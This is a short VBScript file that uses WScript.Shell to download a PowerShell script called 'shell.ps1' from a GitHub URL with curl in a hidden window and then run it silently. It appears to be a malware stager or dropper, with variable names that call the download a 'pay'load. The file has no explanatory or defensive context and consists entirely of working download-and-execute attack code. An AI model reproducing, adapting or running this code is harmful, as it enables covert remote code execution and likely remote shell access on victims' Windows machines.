Set shell = CreateObject("WScript.Shell")

Dim pay, payName

payName = "shell.ps1"
pay = "https://raw.githubusercontent.com/user8-alt0/hubs-n-mor/refs/heads/main/win/shell.ps1"

shell.Run "curl -O " & pay, 0, True
shell.Run payName, 0, False



